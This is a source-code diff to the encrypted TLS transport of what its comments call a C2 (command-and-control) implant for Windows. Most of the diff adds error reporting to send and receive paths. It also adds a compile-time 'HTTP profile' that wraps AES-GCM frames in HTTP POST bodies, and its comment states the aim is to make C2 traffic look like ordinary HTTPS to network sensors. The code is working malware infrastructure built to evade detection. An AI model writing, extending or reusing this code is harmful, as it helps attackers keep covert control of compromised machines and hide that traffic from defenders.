@@ -40,6 +40,13 @@
 #include "tls_client.h"
 #include <stdio.h>
 
+/* Optional HTTP/1.1 transport profile — wraps AES-GCM frames in HTTP POST
+ * bodies so C2 traffic looks like ordinary HTTPS to network sensors.
+ * Enabled by defining C2_HTTP_PROFILE at compile time.                    */
+#ifdef C2_HTTP_PROFILE
+#include "http_profile.h"
+#endif
+
 /* ─────────────────────────────────────────────────────────────────────────── */
 /*  Internal helpers – forward declarations                                    */
 /* ─────────────────────────────────────────────────────────────────────────── */
@@ -122,6 +129,7 @@ BOOL tls_connect(PTLS_CONTEXT pCtx, SOCKET sock,
     ZeroMemory(pCtx, sizeof(*pCtx));
     pCtx->sock    = sock;
     pCtx->recvSeq = (uint64_t)-1;
+    pCtx->lastErr = TLS_ERR_NONE;
 
     memcpy(pCtx->sessionKey, pSecretKey, 32);
 
@@ -176,8 +184,21 @@ BOOL tls_send_msg(PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData)
     BYTE hdr[TLS_HDR_LEN];
     _write_be32(hdr, cbCipher);
 
+#ifdef C2_HTTP_PROFILE
+    /* HTTP profile: send [hdr|cipher] as a single HTTP POST body */
+    DWORD  cbFrame = TLS_HDR_LEN + cbCipher;
+    BYTE  *pFrame  = (BYTE *)malloc(cbFrame);
+    BOOL ok = FALSE;
+    if (pFrame) {
+        memcpy(pFrame,            hdr,     TLS_HDR_LEN);
+        memcpy(pFrame + TLS_HDR_LEN, pCipher, cbCipher);
+        ok = _http_send_frame(pCtx, pFrame, cbFrame);
+        free(pFrame);
+    }
+#else
     BOOL ok = _tls_raw_send(pCtx, hdr, TLS_HDR_LEN) &&
               _tls_raw_send(pCtx, pCipher, cbCipher);
+#endif
     free(pCipher);
     return ok;
 }
@@ -191,16 +212,51 @@ BOOL tls_recv_msg(PTLS_CONTEXT pCtx, BYTE **ppData, DWORD *pcbData)
 {
     if (!pCtx || !ppData || !pcbData) return FALSE;
     *ppData = NULL; *pcbData = 0;
+    pCtx->lastErr = TLS_ERR_NONE;
 
+#ifdef C2_HTTP_PROFILE
+    /* HTTP profile: receive a full HTTP response body, parse hdr from it */
+    BYTE  *pFrame2  = NULL;
+    DWORD  cbFrame2 = 0;
+    if (!_http_recv_frame_alloc(pCtx, &pFrame2, &cbFrame2)) {
+        pCtx->lastErr = TLS_ERR_SOCKET;
+        return FALSE;
+    }
+    if (cbFrame2 < TLS_HDR_LEN) {
+        free(pFrame2);
+        pCtx->lastErr = TLS_ERR_PROTO;
+        return FALSE;
+    }
+    uint32_t totalLen = _read_be32(pFrame2);
+    DWORD cipherLen2  = cbFrame2 - TLS_HDR_LEN;
+    if (totalLen == 0 || totalLen != cipherLen2 ||
+        totalLen > (uint32_t)TLS_MAX_FRAME_SIZE) {
+        free(pFrame2);
+        pCtx->lastErr = TLS_ERR_PROTO;
+        return FALSE;
+    }
+    BYTE *pCipher = (BYTE *)malloc(totalLen);
+    if (!pCipher) { free(pFrame2); pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
+    memcpy(pCipher, pFrame2 + TLS_HDR_LEN, totalLen);
+    free(pFrame2);
+#else
     BYTE hdr[TLS_HDR_LEN];
     if (!_tls_raw_recv(pCtx, hdr, TLS_HDR_LEN)) return FALSE;
+    /* lastErr already set by _tls_raw_recv on socket/timeout failure */
 
     uint32_t totalLen = _read_be32(hdr);
-    if (totalLen == 0 || totalLen > (uint32_t)TLS_MAX_FRAME_SIZE) return FALSE;
+    if (totalLen == 0 || totalLen > (uint32_t)TLS_MAX_FRAME_SIZE) {
+        pCtx->lastErr = TLS_ERR_PROTO;
+        return FALSE;
+    }
 
     BYTE *pCipher = (BYTE *)malloc(totalLen);
-    if (!pCipher) return FALSE;
-    if (!_tls_raw_recv(pCtx, pCipher, totalLen)) { free(pCipher); return FALSE; }
+    if (!pCipher) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
+    if (!_tls_raw_recv(pCtx, pCipher, totalLen)) {
+        free(pCipher); return FALSE;
+        /* lastErr already set by _tls_raw_recv */
+    }
+#endif
 
     BYTE  *pPlain  = NULL;
     DWORD  cbPlain = 0;
@@ -209,21 +265,33 @@ BOOL tls_recv_msg(PTLS_CONTEXT pCtx, BYTE **ppData, DWORD *pcbData)
         ? _gcm_decrypt_ctx(pCtx, pCipher, totalLen, &pPlain, &cbPlain)
         : _gcm_decrypt(pCtx->sessionKey, pCipher, totalLen, &pPlain, &cbPlain);
     if (!decOk) {
-        free(pCipher); return FALSE;
+        free(pCipher);
+        pCtx->lastErr = TLS_ERR_CRYPTO;
+        return FALSE;
     }
     free(pCipher);
 
-    if (cbPlain < TLS_SEQ_LEN) { free(pPlain); return FALSE; }
+    if (cbPlain < TLS_SEQ_LEN) {
+        free(pPlain);
+        pCtx->lastErr = TLS_ERR_CRYPTO;
+        return FALSE;
+    }
 
     uint64_t seq = _read_be64(pPlain);
     if (pCtx->recvSeq != (uint64_t)-1 && seq <= pCtx->recvSeq) {
-        free(pPlain); return FALSE;  /* replay detected */
+        free(pPlain);
+        pCtx->lastErr = TLS_ERR_REPLAY;
+        return FALSE;
     }
     pCtx->recvSeq = seq;
 
     DWORD cbData = cbPlain - TLS_SEQ_LEN;
     BYTE *pData  = (BYTE *)malloc(cbData + 1);
-    if (!pData) { free(pPlain); return FALSE; }
+    if (!pData) {
+        free(pPlain);
+        pCtx->lastErr = TLS_ERR_CRYPTO;
+        return FALSE;
+    }
 
     memcpy(pData, pPlain + TLS_SEQ_LEN, cbData);
     pData[cbData] = '\0';
@@ -496,12 +564,16 @@ static BOOL _tls_raw_recv(PTLS_CONTEXT pCtx, BYTE *pDst, DWORD cbWant)
             if (cbSpace == 0) {
                 DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
                 BYTE *p = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
-                if (!p) return FALSE;
+                if (!p) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
                 pCtx->pRecvBuf = p; pCtx->cbRecvBufAlloc = cbNew;
                 cbSpace = cbNew - pCtx->cbRecvBuf;
             }
             int n = recv(pCtx->sock, (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf), (int)cbSpace, 0);
-            if (n <= 0) return FALSE;
+            if (n <= 0) {
+                pCtx->lastErr = (WSAGetLastError() == WSAETIMEDOUT)
+                    ? TLS_ERR_TIMEOUT : TLS_ERR_SOCKET;
+                return FALSE;
+            }
             pCtx->cbRecvBuf += (DWORD)n;
         }
 
@@ -520,17 +592,21 @@ static BOOL _tls_raw_recv(PTLS_CONTEXT pCtx, BYTE *pDst, DWORD cbWant)
             if (cbSpace == 0) {
                 DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
                 BYTE *p = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
-                if (!p) return FALSE;
+                if (!p) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
                 pCtx->pRecvBuf = p; pCtx->cbRecvBufAlloc = cbNew; cbSpace = cbNew - pCtx->cbRecvBuf;
             }
             int n = recv(pCtx->sock, (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf), (int)cbSpace, 0);
-            if (n <= 0) return FALSE;
+            if (n <= 0) {
+                pCtx->lastErr = (WSAGetLastError() == WSAETIMEDOUT)
+                    ? TLS_ERR_TIMEOUT : TLS_ERR_SOCKET;
+                return FALSE;
+            }
             pCtx->cbRecvBuf += (DWORD)n;
             continue;
         }
 
-        if (ss == SEC_I_RENEGOTIATE) return FALSE; /* C2 disables renegotiation */
-        if (ss != SEC_E_OK) return FALSE;
+        if (ss == SEC_I_RENEGOTIATE) { pCtx->lastErr = TLS_ERR_PROTO; return FALSE; }
+        if (ss != SEC_E_OK)          { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
 
         for (int i = 0; i < 4; i++) {
             if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
